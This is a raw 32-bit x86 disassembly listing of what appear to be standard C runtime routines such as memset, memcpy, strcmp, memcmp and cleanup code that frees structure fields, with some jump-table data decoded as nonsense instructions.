  426156:	call   0x426b76
  42615b:	add    esp,0x18
  42615e:	mov    esi,eax
  426160:	test   esi,esi
  426162:	je     0x426141
  426164:	mov    DWORD PTR [ebp+0xc],esi
  426167:	push   DWORD PTR [ebp+0x14]
  42616a:	push   DWORD PTR [ebp+0x10]
  42616d:	push   DWORD PTR [ebp+0xc]
  426170:	push   DWORD PTR [ebp+0x8]
  426173:	push   ebx
  426174:	call   DWORD PTR ds:0x4280d8
  42617a:	mov    edi,eax
  42617c:	test   esi,esi
  42617e:	je     0x426187
  426180:	push   esi
  426181:	call   0x4244ba
  426186:	pop    ecx
  426187:	mov    eax,edi
  426189:	lea    esp,[ebp-0x38]
  42618c:	call   0x4238e3
  426191:	ret    
  426192:	mov    eax,ds:0x45cdc4
  426197:	test   eax,eax
  426199:	je     0x4261aa
  42619b:	push   DWORD PTR [esp+0x4]
  42619f:	call   eax
  4261a1:	test   eax,eax
  4261a3:	pop    ecx
  4261a4:	je     0x4261aa
  4261a6:	xor    eax,eax
  4261a8:	inc    eax
  4261a9:	ret    
  4261aa:	xor    eax,eax
  4261ac:	ret    
  4261ad:	int3   
  4261ae:	int3   
  4261af:	int3   
  4261b0:	mov    edx,DWORD PTR [esp+0xc]
  4261b4:	mov    ecx,DWORD PTR [esp+0x4]
  4261b8:	test   edx,edx
  4261ba:	je     0x42620b
  4261bc:	xor    eax,eax
  4261be:	mov    al,BYTE PTR [esp+0x8]
  4261c2:	push   edi
  4261c3:	mov    edi,ecx
  4261c5:	cmp    edx,0x4
  4261c8:	jb     0x4261fb
  4261ca:	neg    ecx
  4261cc:	and    ecx,0x3
  4261cf:	je     0x4261dd
  4261d1:	sub    edx,ecx
  4261d3:	mov    BYTE PTR [edi],al
  4261d5:	add    edi,0x1
  4261d8:	sub    ecx,0x1
  4261db:	jne    0x4261d3
  4261dd:	mov    ecx,eax
  4261df:	shl    eax,0x8
  4261e2:	add    eax,ecx
  4261e4:	mov    ecx,eax
  4261e6:	shl    eax,0x10
  4261e9:	add    eax,ecx
  4261eb:	mov    ecx,edx
  4261ed:	and    edx,0x3
  4261f0:	shr    ecx,0x2
  4261f3:	je     0x4261fb
  4261f5:	rep stos DWORD PTR es:[edi],eax
  4261f7:	test   edx,edx
  4261f9:	je     0x426205
  4261fb:	mov    BYTE PTR [edi],al
  4261fd:	add    edi,0x1
  426200:	sub    edx,0x1
  426203:	jne    0x4261fb
  426205:	mov    eax,DWORD PTR [esp+0x8]
  426209:	pop    edi
  42620a:	ret    
  42620b:	mov    eax,DWORD PTR [esp+0x4]
  42620f:	ret    
  426210:	push   esi
  426211:	mov    esi,DWORD PTR [esp+0x8]
  426215:	test   esi,esi
  426217:	je     0x42639e
  42621d:	push   DWORD PTR [esi+0x4]
  426220:	call   0x4244ba
  426225:	push   DWORD PTR [esi+0x8]
  426228:	call   0x4244ba
  42622d:	push   DWORD PTR [esi+0xc]
  426230:	call   0x4244ba
  426235:	push   DWORD PTR [esi+0x10]
  426238:	call   0x4244ba
  42623d:	push   DWORD PTR [esi+0x14]
  426240:	call   0x4244ba
  426245:	push   DWORD PTR [esi+0x18]
  426248:	call   0x4244ba
  42624d:	push   DWORD PTR [esi]
  42624f:	call   0x4244ba
  426254:	push   DWORD PTR [esi+0x20]
  426257:	call   0x4244ba
  42625c:	push   DWORD PTR [esi+0x24]
  42625f:	call   0x4244ba
  426264:	push   DWORD PTR [esi+0x28]
  426267:	call   0x4244ba
  42626c:	push   DWORD PTR [esi+0x2c]
  42626f:	call   0x4244ba
  426274:	push   DWORD PTR [esi+0x30]
  426277:	call   0x4244ba
  42627c:	push   DWORD PTR [esi+0x34]
  42627f:	call   0x4244ba
  426284:	push   DWORD PTR [esi+0x1c]
  426287:	call   0x4244ba
  42628c:	push   DWORD PTR [esi+0x38]
  42628f:	call   0x4244ba
  426294:	push   DWORD PTR [esi+0x3c]
  426297:	call   0x4244ba
  42629c:	add    esp,0x40
  42629f:	push   DWORD PTR [esi+0x40]
  4262a2:	call   0x4244ba
  4262a7:	push   DWORD PTR [esi+0x44]
  4262aa:	call   0x4244ba
  4262af:	push   DWORD PTR [esi+0x48]
  4262b2:	call   0x4244ba
  4262b7:	push   DWORD PTR [esi+0x4c]
  4262ba:	call   0x4244ba
  4262bf:	push   DWORD PTR [esi+0x50]
  4262c2:	call   0x4244ba
  4262c7:	push   DWORD PTR [esi+0x54]
  4262ca:	call   0x4244ba
  4262cf:	push   DWORD PTR [esi+0x58]
  4262d2:	call   0x4244ba
  4262d7:	push   DWORD PTR [esi+0x5c]
  4262da:	call   0x4244ba
  4262df:	push   DWORD PTR [esi+0x60]
  4262e2:	call   0x4244ba
  4262e7:	push   DWORD PTR [esi+0x64]
  4262ea:	call   0x4244ba
  4262ef:	push   DWORD PTR [esi+0x68]
  4262f2:	call   0x4244ba
  4262f7:	push   DWORD PTR [esi+0x6c]
  4262fa:	call   0x4244ba
  4262ff:	push   DWORD PTR [esi+0x70]
  426302:	call   0x4244ba
  426307:	push   DWORD PTR [esi+0x74]
  42630a:	call   0x4244ba
  42630f:	push   DWORD PTR [esi+0x78]
  426312:	call   0x4244ba
  426317:	push   DWORD PTR [esi+0x7c]
  42631a:	call   0x4244ba
  42631f:	add    esp,0x40
  426322:	push   DWORD PTR [esi+0x80]
  426328:	call   0x4244ba
  42632d:	push   DWORD PTR [esi+0x84]
  426333:	call   0x4244ba
  426338:	push   DWORD PTR [esi+0x88]
  42633e:	call   0x4244ba
  426343:	push   DWORD PTR [esi+0x8c]
  426349:	call   0x4244ba
  42634e:	push   DWORD PTR [esi+0x90]
  426354:	call   0x4244ba
  426359:	push   DWORD PTR [esi+0x94]
  42635f:	call   0x4244ba
  426364:	push   DWORD PTR [esi+0x98]
  42636a:	call   0x4244ba
  42636f:	push   DWORD PTR [esi+0x9c]
  426375:	call   0x4244ba
  42637a:	push   DWORD PTR [esi+0xa0]
  426380:	call   0x4244ba
  426385:	push   DWORD PTR [esi+0xa4]
  42638b:	call   0x4244ba
  426390:	push   DWORD PTR [esi+0xa8]
  426396:	call   0x4244ba
  42639b:	add    esp,0x2c
  42639e:	pop    esi
  42639f:	ret    
  4263a0:	push   esi
  4263a1:	mov    esi,DWORD PTR [esp+0x8]
  4263a5:	test   esi,esi
  4263a7:	je     0x4263fd
  4263a9:	mov    eax,DWORD PTR [esi]
  4263ab:	mov    ecx,DWORD PTR ds:0x45c934
  4263b1:	cmp    eax,DWORD PTR [ecx]
  4263b3:	je     0x4263c4
  4263b5:	cmp    eax,DWORD PTR ds:0x45c904
  4263bb:	je     0x4263c4
  4263bd:	push   eax
  4263be:	call   0x4244ba
  4263c3:	pop    ecx
  4263c4:	mov    eax,DWORD PTR [esi+0x4]
  4263c7:	mov    ecx,DWORD PTR ds:0x45c934
  4263cd:	cmp    eax,DWORD PTR [ecx+0x4]
  4263d0:	je     0x4263e1
  4263d2:	cmp    eax,DWORD PTR ds:0x45c908
  4263d8:	je     0x4263e1
  4263da:	push   eax
  4263db:	call   0x4244ba
  4263e0:	pop    ecx
  4263e1:	mov    esi,DWORD PTR [esi+0x8]
  4263e4:	mov    eax,ds:0x45c934
  4263e9:	cmp    esi,DWORD PTR [eax+0x8]
  4263ec:	je     0x4263fd
  4263ee:	cmp    esi,DWORD PTR ds:0x45c90c
  4263f4:	je     0x4263fd
  4263f6:	push   esi
  4263f7:	call   0x4244ba
  4263fc:	pop    ecx
  4263fd:	pop    esi
  4263fe:	ret    
  4263ff:	push   esi
  426400:	mov    esi,DWORD PTR [esp+0x8]
  426404:	test   esi,esi
  426406:	je     0x4264d6
  42640c:	mov    eax,DWORD PTR [esi+0xc]
  42640f:	mov    ecx,DWORD PTR ds:0x45c934
  426415:	cmp    eax,DWORD PTR [ecx+0xc]
  426418:	je     0x426429
  42641a:	cmp    eax,DWORD PTR ds:0x45c910
  426420:	je     0x426429
  426422:	push   eax
  426423:	call   0x4244ba
  426428:	pop    ecx
  426429:	mov    eax,DWORD PTR [esi+0x10]
  42642c:	mov    ecx,DWORD PTR ds:0x45c934
  426432:	cmp    eax,DWORD PTR [ecx+0x10]
  426435:	je     0x426446
  426437:	cmp    eax,DWORD PTR ds:0x45c914
  42643d:	je     0x426446
  42643f:	push   eax
  426440:	call   0x4244ba
  426445:	pop    ecx
  426446:	mov    eax,DWORD PTR [esi+0x14]
  426449:	mov    ecx,DWORD PTR ds:0x45c934
  42644f:	cmp    eax,DWORD PTR [ecx+0x14]
  426452:	je     0x426463
  426454:	cmp    eax,DWORD PTR ds:0x45c918
  42645a:	je     0x426463
  42645c:	push   eax
  42645d:	call   0x4244ba
  426462:	pop    ecx
  426463:	mov    eax,DWORD PTR [esi+0x18]
  426466:	mov    ecx,DWORD PTR ds:0x45c934
  42646c:	cmp    eax,DWORD PTR [ecx+0x18]
  42646f:	je     0x426480
  426471:	cmp    eax,DWORD PTR ds:0x45c91c
  426477:	je     0x426480
  426479:	push   eax
  42647a:	call   0x4244ba
  42647f:	pop    ecx
  426480:	mov    eax,DWORD PTR [esi+0x1c]
  426483:	mov    ecx,DWORD PTR ds:0x45c934
  426489:	cmp    eax,DWORD PTR [ecx+0x1c]
  42648c:	je     0x42649d
  42648e:	cmp    eax,DWORD PTR ds:0x45c920
  426494:	je     0x42649d
  426496:	push   eax
  426497:	call   0x4244ba
  42649c:	pop    ecx
  42649d:	mov    eax,DWORD PTR [esi+0x20]
  4264a0:	mov    ecx,DWORD PTR ds:0x45c934
  4264a6:	cmp    eax,DWORD PTR [ecx+0x20]
  4264a9:	je     0x4264ba
  4264ab:	cmp    eax,DWORD PTR ds:0x45c924
  4264b1:	je     0x4264ba
  4264b3:	push   eax
  4264b4:	call   0x4244ba
  4264b9:	pop    ecx
  4264ba:	mov    esi,DWORD PTR [esi+0x24]
  4264bd:	mov    eax,ds:0x45c934
  4264c2:	cmp    esi,DWORD PTR [eax+0x24]
  4264c5:	je     0x4264d6
  4264c7:	cmp    esi,DWORD PTR ds:0x45c928
  4264cd:	je     0x4264d6
  4264cf:	push   esi
  4264d0:	call   0x4244ba
  4264d5:	pop    ecx
  4264d6:	pop    esi
  4264d7:	ret    
  4264d8:	int3   
  4264d9:	int3   
  4264da:	int3   
  4264db:	int3   
  4264dc:	int3   
  4264dd:	int3   
  4264de:	int3   
  4264df:	int3   
  4264e0:	push   ebp
  4264e1:	mov    ebp,esp
  4264e3:	push   esi
  4264e4:	xor    eax,eax
  4264e6:	push   eax
  4264e7:	push   eax
  4264e8:	push   eax
  4264e9:	push   eax
  4264ea:	push   eax
  4264eb:	push   eax
  4264ec:	push   eax
  4264ed:	push   eax
  4264ee:	mov    edx,DWORD PTR [ebp+0xc]
  4264f1:	lea    ecx,[ecx+0x0]
  4264f4:	mov    al,BYTE PTR [edx]
  4264f6:	or     al,al
  4264f8:	je     0x426503
  4264fa:	add    edx,0x1
  4264fd:	bts    DWORD PTR [esp],eax
  426501:	jmp    0x4264f4
  426503:	mov    esi,DWORD PTR [ebp+0x8]
  426506:	or     ecx,0xffffffff
  426509:	lea    ecx,[ecx+0x0]
  42650c:	add    ecx,0x1
  42650f:	mov    al,BYTE PTR [esi]
  426511:	or     al,al
  426513:	je     0x42651e
  426515:	add    esi,0x1
  426518:	bt     DWORD PTR [esp],eax
  42651c:	jae    0x42650c
  42651e:	mov    eax,ecx
  426520:	add    esp,0x20
  426523:	pop    esi
  426524:	leave  
  426525:	ret    
  426526:	int3   
  426527:	int3   
  426528:	int3   
  426529:	int3   
  42652a:	int3   
  42652b:	int3   
  42652c:	int3   
  42652d:	int3   
  42652e:	int3   
  42652f:	int3   
  426530:	mov    edx,DWORD PTR [esp+0x4]
  426534:	mov    ecx,DWORD PTR [esp+0x8]
  426538:	test   edx,0x3
  42653e:	jne    0x42657c
  426540:	mov    eax,DWORD PTR [edx]
  426542:	cmp    al,BYTE PTR [ecx]
  426544:	jne    0x426574
  426546:	or     al,al
  426548:	je     0x426570
  42654a:	cmp    ah,BYTE PTR [ecx+0x1]
  42654d:	jne    0x426574
  42654f:	or     ah,ah
  426551:	je     0x426570
  426553:	shr    eax,0x10
  426556:	cmp    al,BYTE PTR [ecx+0x2]
  426559:	jne    0x426574
  42655b:	or     al,al
  42655d:	je     0x426570
  42655f:	cmp    ah,BYTE PTR [ecx+0x3]
  426562:	jne    0x426574
  426564:	add    ecx,0x4
  426567:	add    edx,0x4
  42656a:	or     ah,ah
  42656c:	jne    0x426540
  42656e:	mov    edi,edi
  426570:	xor    eax,eax
  426572:	ret    
  426573:	nop
  426574:	sbb    eax,eax
  426576:	shl    eax,1
  426578:	add    eax,0x1
  42657b:	ret    
  42657c:	test   edx,0x1
  426582:	je     0x42659c
  426584:	mov    al,BYTE PTR [edx]
  426586:	add    edx,0x1
  426589:	cmp    al,BYTE PTR [ecx]
  42658b:	jne    0x426574
  42658d:	add    ecx,0x1
  426590:	or     al,al
  426592:	je     0x426570
  426594:	test   edx,0x2
  42659a:	je     0x426540
  42659c:	mov    ax,WORD PTR [edx]
  42659f:	add    edx,0x2
  4265a2:	cmp    al,BYTE PTR [ecx]
  4265a4:	jne    0x426574
  4265a6:	or     al,al
  4265a8:	je     0x426570
  4265aa:	cmp    ah,BYTE PTR [ecx+0x1]
  4265ad:	jne    0x426574
  4265af:	or     ah,ah
  4265b1:	je     0x426570
  4265b3:	add    ecx,0x2
  4265b6:	jmp    0x426540
  4265b8:	int3   
  4265b9:	int3   
  4265ba:	int3   
  4265bb:	int3   
  4265bc:	int3   
  4265bd:	int3   
  4265be:	int3   
  4265bf:	int3   
  4265c0:	mov    eax,DWORD PTR [esp+0xc]
  4265c4:	test   eax,eax
  4265c6:	je     0x426612
  4265c8:	mov    edx,DWORD PTR [esp+0x4]
  4265cc:	push   esi
  4265cd:	push   edi
  4265ce:	mov    esi,edx
  4265d0:	mov    edi,DWORD PTR [esp+0x10]
  4265d4:	or     edx,edi
  4265d6:	and    edx,0x3
  4265d9:	je     0x426613
  4265db:	test   eax,0x1
  4265e0:	je     0x4265f3
  4265e2:	mov    cl,BYTE PTR [esi]
  4265e4:	cmp    cl,BYTE PTR [edi]
  4265e6:	jne    0x426640
  4265e8:	add    esi,0x1
  4265eb:	add    edi,0x1
  4265ee:	sub    eax,0x1
  4265f1:	je     0x426610
  4265f3:	mov    cl,BYTE PTR [esi]
  4265f5:	mov    dl,BYTE PTR [edi]
  4265f7:	cmp    cl,dl
  4265f9:	jne    0x426640
  4265fb:	mov    cl,BYTE PTR [esi+0x1]
  4265fe:	mov    dl,BYTE PTR [edi+0x1]
  426601:	cmp    cl,dl
  426603:	jne    0x426640
  426605:	add    edi,0x2
  426608:	add    esi,0x2
  42660b:	sub    eax,0x2
  42660e:	jne    0x4265f3
  426610:	pop    edi
  426611:	pop    esi
  426612:	ret    
  426613:	mov    ecx,eax
  426615:	and    eax,0x3
  426618:	shr    ecx,0x2
  42661b:	je     0x426648
  42661d:	repz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42661f:	je     0x426648
  426621:	mov    ecx,DWORD PTR [esi-0x4]
  426624:	mov    edx,DWORD PTR [edi-0x4]
  426627:	cmp    cl,dl
  426629:	jne    0x42663b
  42662b:	cmp    ch,dh
  42662d:	jne    0x42663b
  42662f:	shr    ecx,0x10
  426632:	shr    edx,0x10
  426635:	cmp    cl,dl
  426637:	jne    0x42663b
  426639:	cmp    ch,dh
  42663b:	mov    eax,0x0
  426640:	sbb    eax,eax
  426642:	pop    edi
  426643:	sbb    eax,0xffffffff
  426646:	pop    esi
  426647:	ret    
  426648:	test   eax,eax
  42664a:	je     0x426610
  42664c:	mov    edx,DWORD PTR [esi]
  42664e:	mov    ecx,DWORD PTR [edi]
  426650:	cmp    dl,cl
  426652:	jne    0x42663b
  426654:	sub    eax,0x1
  426657:	je     0x426675
  426659:	cmp    dh,ch
  42665b:	jne    0x42663b
  42665d:	sub    eax,0x1
  426660:	je     0x426675
  426662:	and    ecx,0xff0000
  426668:	and    edx,0xff0000
  42666e:	cmp    edx,ecx
  426670:	jne    0x42663b
  426672:	sub    eax,0x1
  426675:	pop    edi
  426676:	pop    esi
  426677:	ret    
  426678:	int3   
  426679:	int3   
  42667a:	int3   
  42667b:	int3   
  42667c:	int3   
  42667d:	int3   
  42667e:	int3   
  42667f:	int3   
  426680:	push   ebp
  426681:	mov    ebp,esp
  426683:	push   edi
  426684:	push   esi
  426685:	push   ebx
  426686:	mov    ecx,DWORD PTR [ebp+0x10]
  426689:	jecxz  0x4266b2
  42668b:	mov    ebx,ecx
  42668d:	mov    edi,DWORD PTR [ebp+0x8]
  426690:	mov    esi,edi
  426692:	xor    eax,eax
  426694:	repnz scas al,BYTE PTR es:[edi]
  426696:	neg    ecx
  426698:	add    ecx,ebx
  42669a:	mov    edi,esi
  42669c:	mov    esi,DWORD PTR [ebp+0xc]
  42669f:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4266a1:	mov    al,BYTE PTR [esi-0x1]
  4266a4:	xor    ecx,ecx
  4266a6:	cmp    al,BYTE PTR [edi-0x1]
  4266a9:	ja     0x4266b0
  4266ab:	je     0x4266b2
  4266ad:	sub    ecx,0x2
  4266b0:	not    ecx
  4266b2:	mov    eax,ecx
  4266b4:	pop    ebx
  4266b5:	pop    esi
  4266b6:	pop    edi
  4266b7:	leave  
  4266b8:	ret    
  4266b9:	int3   
  4266ba:	int3   
  4266bb:	int3   
  4266bc:	int3   
  4266bd:	int3   
  4266be:	int3   
  4266bf:	int3   
  4266c0:	push   ebp
  4266c1:	mov    ebp,esp
  4266c3:	push   esi
  4266c4:	xor    eax,eax
  4266c6:	push   eax
  4266c7:	push   eax
  4266c8:	push   eax
  4266c9:	push   eax
  4266ca:	push   eax
  4266cb:	push   eax
  4266cc:	push   eax
  4266cd:	push   eax
  4266ce:	mov    edx,DWORD PTR [ebp+0xc]
  4266d1:	lea    ecx,[ecx+0x0]
  4266d4:	mov    al,BYTE PTR [edx]
  4266d6:	or     al,al
  4266d8:	je     0x4266e3
  4266da:	add    edx,0x1
  4266dd:	bts    DWORD PTR [esp],eax
  4266e1:	jmp    0x4266d4
  4266e3:	mov    esi,DWORD PTR [ebp+0x8]
  4266e6:	mov    edi,edi
  4266e8:	mov    al,BYTE PTR [esi]
  4266ea:	or     al,al
  4266ec:	je     0x4266fa
  4266ee:	add    esi,0x1
  4266f1:	bt     DWORD PTR [esp],eax
  4266f5:	jae    0x4266e8
  4266f7:	lea    eax,[esi-0x1]
  4266fa:	add    esp,0x20
  4266fd:	pop    esi
  4266fe:	leave  
  4266ff:	ret    
  426700:	push   ebp
  426701:	mov    ebp,esp
  426703:	push   ebx
  426704:	push   esi
  426705:	push   edi
  426706:	push   ebp
  426707:	push   0x0
  426709:	push   0x0
  42670b:	push   0x426718
  426710:	push   DWORD PTR [ebp+0x8]
  426713:	call   0x42718e
  426718:	pop    ebp
  426719:	pop    edi
  42671a:	pop    esi
  42671b:	pop    ebx
  42671c:	mov    esp,ebp
  42671e:	pop    ebp
  42671f:	ret    
  426720:	mov    ecx,DWORD PTR [esp+0x4]
  426724:	test   DWORD PTR [ecx+0x4],0x6
  42672b:	mov    eax,0x1
  426730:	je     0x426741
  426732:	mov    eax,DWORD PTR [esp+0x8]
  426736:	mov    edx,DWORD PTR [esp+0x10]
  42673a:	mov    DWORD PTR [edx],eax
  42673c:	mov    eax,0x3
  426741:	ret    
  426742:	push   ebx
  426743:	push   esi
  426744:	push   edi
  426745:	mov    eax,DWORD PTR [esp+0x10]
  426749:	push   eax
  42674a:	push   0xfffffffe
  42674c:	push   0x426720
  426751:	push   DWORD PTR fs:0x0
  426758:	mov    DWORD PTR fs:0x0,esp
  42675f:	mov    eax,DWORD PTR [esp+0x20]
  426763:	mov    ebx,DWORD PTR [eax+0x8]
  426766:	mov    esi,DWORD PTR [eax+0xc]
  426769:	cmp    esi,0xffffffff
  42676c:	je     0x42679c
  42676e:	cmp    esi,DWORD PTR [esp+0x24]
  426772:	je     0x42679c
  426774:	lea    esi,[esi+esi*2]
  426777:	mov    ecx,DWORD PTR [ebx+esi*4]
  42677a:	mov    DWORD PTR [esp+0x8],ecx
  42677e:	mov    DWORD PTR [eax+0xc],ecx
  426781:	cmp    DWORD PTR [ebx+esi*4+0x4],0x0
  426786:	jne    0x42679a
  426788:	push   0x101
  42678d:	mov    eax,DWORD PTR [ebx+esi*4+0x8]
  426791:	call   0x4267d6
  426796:	call   DWORD PTR [ebx+esi*4+0x8]
  42679a:	jmp    0x42675f
  42679c:	pop    DWORD PTR fs:0x0
  4267a3:	add    esp,0xc
  4267a6:	pop    edi
  4267a7:	pop    esi
  4267a8:	pop    ebx
  4267a9:	ret    
  4267aa:	xor    eax,eax
  4267ac:	mov    ecx,DWORD PTR fs:0x0
  4267b3:	cmp    DWORD PTR [ecx+0x4],0x426720
  4267ba:	jne    0x4267cc
  4267bc:	mov    edx,DWORD PTR [ecx+0xc]
  4267bf:	mov    edx,DWORD PTR [edx+0xc]
  4267c2:	cmp    DWORD PTR [ecx+0x8],edx
  4267c5:	jne    0x4267cc
  4267c7:	mov    eax,0x1
  4267cc:	ret    
  4267cd:	push   ebx
  4267ce:	push   ecx
  4267cf:	mov    ebx,0x45c94c
  4267d4:	jmp    0x4267e0
  4267d6:	push   ebx
  4267d7:	push   ecx
  4267d8:	mov    ebx,0x45c94c
  4267dd:	mov    ecx,DWORD PTR [ebp+0x8]
  4267e0:	mov    DWORD PTR [ebx+0x8],ecx
  4267e3:	mov    DWORD PTR [ebx+0x4],eax
  4267e6:	mov    DWORD PTR [ebx+0xc],ebp
  4267e9:	pop    ecx
  4267ea:	pop    ebx
  4267eb:	ret    0x4
  4267ee:	int3   
  4267ef:	int3   
  4267f0:	push   ebp
  4267f1:	mov    ebp,esp
  4267f3:	push   edi
  4267f4:	push   esi
  4267f5:	mov    esi,DWORD PTR [ebp+0xc]
  4267f8:	mov    ecx,DWORD PTR [ebp+0x10]
  4267fb:	mov    edi,DWORD PTR [ebp+0x8]
  4267fe:	mov    eax,ecx
  426800:	mov    edx,ecx
  426802:	add    eax,esi
  426804:	cmp    edi,esi
  426806:	jbe    0x426810
  426808:	cmp    edi,eax
  42680a:	jb     0x42698c
  426810:	test   edi,0x3
  426816:	jne    0x42682c
  426818:	shr    ecx,0x2
  42681b:	and    edx,0x3
  42681e:	cmp    ecx,0x8
  426821:	jb     0x42684c
  426823:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426825:	jmp    DWORD PTR [edx*4+0x42693c]
  42682c:	mov    eax,edi
  42682e:	mov    edx,0x3
  426833:	sub    ecx,0x4
  426836:	jb     0x426844
  426838:	and    eax,0x3
  42683b:	add    ecx,eax
  42683d:	jmp    DWORD PTR [eax*4+0x426850]
  426844:	jmp    DWORD PTR [ecx*4+0x42694c]
  42684b:	nop
  42684c:	jmp    DWORD PTR [ecx*4+0x4268d0]
  426853:	nop
  426854:	pusha  
  426855:	push   0x688c0042
  42685a:	inc    edx
  42685b:	add    BYTE PTR [eax+0x23004268],dh
  426861:	ror    DWORD PTR [edx-0x75f877fa],1
  426867:	inc    esi
  426868:	add    DWORD PTR [eax+0x468a0147],ecx
  42686e:	add    al,cl
  426870:	jmp    0x289f077
  426875:	add    esi,0x3
  426878:	add    edi,0x3
  42687b:	cmp    ecx,0x8
  42687e:	jb     0x42684c
  426880:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426882:	jmp    DWORD PTR [edx*4+0x42693c]
  426889:	lea    ecx,[ecx+0x0]
  42688c:	and    edx,ecx
  42688e:	mov    al,BYTE PTR [esi]
  426890:	mov    BYTE PTR [edi],al
  426892:	mov    al,BYTE PTR [esi+0x1]
  426895:	shr    ecx,0x2
  426898:	mov    BYTE PTR [edi+0x1],al
  42689b:	add    esi,0x2
  42689e:	add    edi,0x2
  4268a1:	cmp    ecx,0x8
  4268a4:	jb     0x42684c
  4268a6:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4268a8:	jmp    DWORD PTR [edx*4+0x42693c]
  4268af:	nop
  4268b0:	and    edx,ecx
  4268b2:	mov    al,BYTE PTR [esi]
  4268b4:	mov    BYTE PTR [edi],al
  4268b6:	add    esi,0x1
  4268b9:	shr    ecx,0x2
  4268bc:	add    edi,0x1
  4268bf:	cmp    ecx,0x8
  4268c2:	jb     0x42684c
  4268c4:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4268c6:	jmp    DWORD PTR [edx*4+0x42693c]
  4268cd:	lea    ecx,[ecx+0x0]
  4268d0:	xor    ebp,DWORD PTR [ecx+0x42]
  4268d3:	add    BYTE PTR [eax],ah
  4268d5:	imul   eax,DWORD PTR [edx+0x0],0x426918
  4268dc:	adc    BYTE PTR [ecx+0x42],ch
  4268df:	add    BYTE PTR [eax],cl
  4268e1:	imul   eax,DWORD PTR [edx+0x0],0x426900
  4268e8:	clc    
  4268e9:	push   0x68f00042
  4268ee:	inc    edx
  4268ef:	add    BYTE PTR [ebx-0x761b71bc],cl
  4268f5:	inc    esp
  4268f6:	(bad)  
  4268f7:	in     al,0x8b
  4268f9:	inc    esp
  4268fa:	mov    gs,eax
  4268fc:	mov    DWORD PTR [edi+ecx*4-0x18],eax
  426900:	mov    eax,DWORD PTR [esi+ecx*4-0x14]
  426904:	mov    DWORD PTR [edi+ecx*4-0x14],eax
  426908:	mov    eax,DWORD PTR [esi+ecx*4-0x10]
  42690c:	mov    DWORD PTR [edi+ecx*4-0x10],eax
  426910:	mov    eax,DWORD PTR [esi+ecx*4-0xc]
  426914:	mov    DWORD PTR [edi+ecx*4-0xc],eax
  426918:	mov    eax,DWORD PTR [esi+ecx*4-0x8]
  42691c:	mov    DWORD PTR [edi+ecx*4-0x8],eax
  426920:	mov    eax,DWORD PTR [esi+ecx*4-0x4]
  426924:	mov    DWORD PTR [edi+ecx*4-0x4],eax
  426928:	lea    eax,[ecx*4+0x0]
  42692f:	add    esi,eax
  426931:	add    edi,eax
  426933:	jmp    DWORD PTR [edx*4+0x42693c]
  42693a:	mov    edi,edi
  42693c:	dec    esp
  42693d:	imul   eax,DWORD PTR [edx+0x0],0x426954
  426944:	pusha  
  426945:	imul   eax,DWORD PTR [edx+0x0],0x426974
  42694c:	mov    eax,DWORD PTR [ebp+0x8]
  42694f:	pop    esi
  426950:	pop    edi
  426951:	leave  
  426952:	ret    
  426953:	nop
  426954:	mov    al,BYTE PTR [esi]
  426956:	mov    BYTE PTR [edi],al
  426958:	mov    eax,DWORD PTR [ebp+0x8]
  42695b:	pop    esi
  42695c:	pop    edi
  42695d:	leave  
  42695e:	ret    
  42695f:	nop
  426960:	mov    al,BYTE PTR [esi]
  426962:	mov    BYTE PTR [edi],al
  426964:	mov    al,BYTE PTR [esi+0x1]
  426967:	mov    BYTE PTR [edi+0x1],al
  42696a:	mov    eax,DWORD PTR [ebp+0x8]
  42696d:	pop    esi
  42696e:	pop    edi
  42696f:	leave  
  426970:	ret    
  426971:	lea    ecx,[ecx+0x0]
  426974:	mov    al,BYTE PTR [esi]
  426976:	mov    BYTE PTR [edi],al
  426978:	mov    al,BYTE PTR [esi+0x1]
  42697b:	mov    BYTE PTR [edi+0x1],al
  42697e:	mov    al,BYTE PTR [esi+0x2]
  426981:	mov    BYTE PTR [edi+0x2],al
  426984:	mov    eax,DWORD PTR [ebp+0x8]
  426987:	pop    esi
  426988:	pop    edi
  426989:	leave  
  42698a:	ret    
  42698b:	nop
  42698c:	lea    esi,[ecx+esi*1-0x4]
  426990:	lea    edi,[ecx+edi*1-0x4]
  426994:	test   edi,0x3
  42699a:	jne    0x4269c0
  42699c:	shr    ecx,0x2
  42699f:	and    edx,0x3
  4269a2:	cmp    ecx,0x8
  4269a5:	jb     0x4269b4
  4269a7:	std    
  4269a8:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4269aa:	cld    
  4269ab:	jmp    DWORD PTR [edx*4+0x426ad8]
  4269b2:	mov    edi,edi
  4269b4:	neg    ecx
  4269b6:	jmp    DWORD PTR [ecx*4+0x426a88]
  4269bd:	lea    ecx,[ecx+0x0]
  4269c0:	mov    eax,edi
  4269c2:	mov    edx,0x3
  4269c7:	cmp    ecx,0x4
  4269ca:	jb     0x4269d8
  4269cc:	and    eax,0x3
  4269cf:	sub    ecx,eax
  4269d1:	jmp    DWORD PTR [eax*4+0x4269dc]
  4269d8:	jmp    DWORD PTR [ecx*4+0x426ad8]
  4269df:	nop
  4269e0:	in     al,dx
  4269e1:	imul   eax,DWORD PTR [edx+0x0],0x426a10
  4269e8:	cmp    BYTE PTR [edx+0x42],ch
  4269eb:	add    BYTE PTR [edx-0x2edcfcba],cl
  4269f1:	mov    BYTE PTR [edi+0x3],al
  4269f4:	sub    esi,0x1
  4269f7:	shr    ecx,0x2
  4269fa:	sub    edi,0x1
  4269fd:	cmp    ecx,0x8
  426a00:	jb     0x4269b4
  426a02:	std    
  426a03:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426a05:	cld    
  426a06:	jmp    DWORD PTR [edx*4+0x426ad8]
  426a0d:	lea    ecx,[ecx+0x0]
  426a10:	mov    al,BYTE PTR [esi+0x3]
  426a13:	and    edx,ecx
  426a15:	mov    BYTE PTR [edi+0x3],al
  426a18:	mov    al,BYTE PTR [esi+0x2]
  426a1b:	shr    ecx,0x2
  426a1e:	mov    BYTE PTR [edi+0x2],al
  426a21:	sub    esi,0x2
  426a24:	sub    edi,0x2
  426a27:	cmp    ecx,0x8
  426a2a:	jb     0x4269b4
  426a2c:	std    
  426a2d:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426a2f:	cld    
  426a30:	jmp    DWORD PTR [edx*4+0x426ad8]
  426a37:	nop
